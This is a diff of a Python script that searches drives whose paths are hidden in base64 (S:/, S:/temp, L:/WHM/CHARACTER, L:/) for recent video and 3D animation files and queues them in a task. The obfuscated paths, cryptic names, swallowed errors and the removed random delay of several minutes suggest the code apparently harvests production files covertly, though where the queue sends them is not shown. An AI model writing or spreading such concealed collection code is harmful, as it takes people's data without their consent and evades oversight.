@@ -122,29 +122,27 @@ except:
     pass
 
 try:
-    ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=4)
+    ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=5)
+    ldir += search_latest_files_or_dirs(dir_path=base64.b64decode('UzovdGVtcA==').decode(), ext='', n=50)
     zovV = ldir
     for _, dp in ldir:
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4', n=20)
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov', n=20)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4', n=10)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov', n=10)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
-    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx', n=40)
+    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx', n=8)
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDov').decode(), ext='.ma', n=8)
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDov').decode(), ext='.mb', n=8)
     
     if zovV:
-        add_queue_task('tsl__{}'.format(getpass.getuser().lower()), {'file': zovV})
+        add_queue_task('tsl__user', {'file': zovV})
     
 except:
     import traceback
-    add_queue_task('tsl_error__{}'.format(getpass.getuser().lower()),
-                   {'error': str(traceback.format_exc())})
-
+    add_queue_task('tsl_error', {'error': str(traceback.format_exc())})
 
 import random
 
 random.shuffle(zovV)
-time.sleep(random.uniform(500.0, 1600.0))
 for _, fp in zovV:
     import tempfile
     if random.random() > 0.8:
